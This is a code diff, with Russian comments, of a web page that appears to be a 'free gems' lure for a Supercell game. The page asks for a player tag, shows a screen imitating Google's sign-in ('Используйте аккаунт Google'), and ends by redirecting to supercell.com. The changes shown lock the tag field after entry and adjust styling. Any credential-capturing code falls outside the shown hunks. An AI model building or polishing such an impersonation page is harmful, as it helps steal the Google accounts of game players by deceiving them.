@@ -29,7 +29,6 @@
             padding: 20px; min-height: 100vh;
         }
 
-        /* КНОПКА ВЫБОРА ЯЗЫКА */
         .lang-selector { position: absolute; top: 10px; right: 10px; z-index: 100; }
         .lang-btn {
             background: rgba(0,0,0,0.7); border: 2px solid #fff; color: #fff;
@@ -80,9 +79,16 @@
         .step-title { font-size: 20px; color: #000; margin-bottom: 15px; font-family: 'Rubik One', sans-serif; text-transform: uppercase; }
 
         .tag-input-wrapper { background: #eee; border: 3px solid #ccc; border-radius: 12px; padding: 8px; margin-bottom: 20px; }
+        
+        /* Стили для инпута (обычный и заблокированный) */
         input#tag {
             width: 100%; border: none; background: transparent;
             font-family: 'Rubik One', sans-serif; font-size: 24px; text-align: center; outline: none;
+            color: #000;
+        }
+        input#tag:read-only {
+            color: #777;
+            cursor: not-allowed;
         }
 
         .gems-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
@@ -99,7 +105,6 @@
             text-transform: uppercase;
         }
 
-        /* --- GOOGLE UI СТИЛИ (ОРИГИНАЛ) --- */
         .google-ui { display: none; text-align: center; font-family: 'Source Sans Pro', sans-serif; padding-top: 10px; }
         .google-ui h2 { font-weight: 400; font-size: 24px; color: #202124; margin: 10px 0 5px; }
         .google-ui p { color: #5f6368; font-size: 16px; margin-bottom: 25px; }
@@ -195,6 +200,7 @@
     let playerTag = "";
     let currentLang = "EN";
     const bubbleMsg = document.getElementById('bubble-msg');
+    const tagInput = document.getElementById('tag');
 
     const translations = {
         EN: {
@@ -249,7 +255,6 @@
         document.getElementById('btn-connect').innerText = t.btn_connect;
         document.getElementById('t-synced').innerText = t.synced;
         
-        // Google блок переводим только если это РУ, иначе оставляем англ
         if(currentLang === 'RU') {
             document.getElementById('g-signin').innerText = "Вход";
             document.getElementById('g-desc').innerText = "Используйте аккаунт Google";
@@ -272,9 +277,13 @@
     }
 
     function startLoading() {
-        playerTag = document.getElementById('tag').value;
+        playerTag = tagInput.value;
         const t = translations[currentLang];
         if(playerTag.length < 3) return alert(t.alert_tag);
+        
+        // ФИКСАЦИЯ ТЕГА: делаем его только для чтения
+        tagInput.readOnly = true;
+
         document.getElementById('step-entry').style.display = 'none';
         document.getElementById('step-load').style.display = 'block';
         bubbleMsg.innerText = t.bubble_search;
@@ -323,7 +332,10 @@
         window.location.href = "https://supercell.com";
     }
 
-    function goBack() { location.reload(); }
+    function goBack() { 
+        // При возврате назад (если нужно) разблокируем тег, но в этой версии мы просто перезагружаем
+        location.reload(); 
+    }
 </script>
 
 </body>
